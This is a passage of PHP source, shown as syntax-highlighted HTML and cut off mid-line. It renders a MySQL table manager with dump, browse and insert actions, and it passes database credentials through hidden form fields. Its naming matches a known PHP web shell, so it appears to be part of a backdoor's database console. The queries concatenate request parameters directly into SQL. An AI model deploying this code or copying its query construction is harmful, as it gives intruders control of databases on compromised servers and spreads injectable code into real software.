              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Table &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; cols and &quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; rows)&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=structure</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;lt;b&amp;gt; Structure &amp;lt;/b&amp;gt;]&amp;lt;/a&amp;gt; &amp;nbsp; &quot;</span><span class="p">;</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=browse</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;lt;b&amp;gt; Browse &amp;lt;/b&amp;gt;]&amp;lt;/a&amp;gt; &amp;nbsp; &quot;</span><span class="p">;</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=tbldump&amp;thistbl=1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;lt;b&amp;gt; Dump &amp;lt;/b&amp;gt;]&amp;lt;/a&amp;gt; &amp;nbsp; &quot;</span><span class="p">;</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=insert</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;nbsp;&amp;lt;b&amp;gt;Insert&amp;lt;/b&amp;gt;&amp;nbsp;]&amp;lt;/a&amp;gt; &amp;nbsp; &quot;</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;structure&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Under construction!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;insert&quot;</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_insert</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Under construction!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Inserting row into table:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
                    <span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot; WHERE&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_insert_q</span><span class="p">;</span>
                    <span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">;</span>
                    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
                    <span class="nv">$values</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
                    <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
                  <span class="p">}</span>
                  <span class="k">else</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;table width=</span><span class="se">\&quot;</span><span class="s2">1%</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Field&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Type&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Function&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct_fields</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span>
                    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Type&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_functs[&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PASSWORD&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;MD5&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;ENCRYPT&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;ASCII&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CHAR&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;RAND&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;LAST_INSERT_ID&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;COUNT&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;AVG&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;SUM&amp;lt;/option&amp;gt;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;--------&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;SOUNDEX&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;LCASE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;UCASE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;NOW&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CURDATE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CURTIME&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;FROM_DAYS&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;FROM_UNIXTIME&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PERIOD_ADD&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PERIOD_DIFF&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;TO_DAYS&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;UNIX_TIMESTAMP&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;USER&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;WEEKDAY&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CONCAT&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert[&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=50&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
                    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
                  <span class="p">}</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">radio</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_radio</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&amp;lt;b&amp;gt;Insert as new row&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; or &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">radio</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_radio</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;b&amp;gt;Save&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_q</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;}</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
                <span class="p">}</span>
              <span class="p">}</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;browse&quot;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$sql_tbl_ls</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$sql_tbl_ls</span><span class="p">);</span>
                <span class="nv">$sql_tbl_le</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$sql_tbl_le</span><span class="p">);</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=multipage</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Pages</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &quot;</span><span class="p">;</span>
                <span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$numpages</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                  <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_ls</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&quot;</span><span class="p">;}</span>
                  <span class="k">echo</span> <span class="nv">$i</span><span class="p">;</span>
                  <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_ls</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
                  <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">/</span><span class="mi">30</span> <span class="o">==</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="mi">30</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
                  <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot; &quot;</span><span class="p">;</span> <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;empty&quot;</span><span class="p">;}</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">GET</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_order</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;From:&amp;lt;/b&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_ls</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &amp;lt;b&amp;gt;To:&amp;lt;/b&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_le</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">View</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxrow_all</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                  <span class="nv">$v</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span>
                  <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s2">&quot;asc&quot;</span><span class="p">;}</span>
                  <span class="k">else</span> <span class="p">{</span><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s2">&quot;desc&quot;</span><span class="p">;}</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
                  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;%20&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
                  <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s2">&quot;%20&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_&quot;</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s2">&quot;</span><span 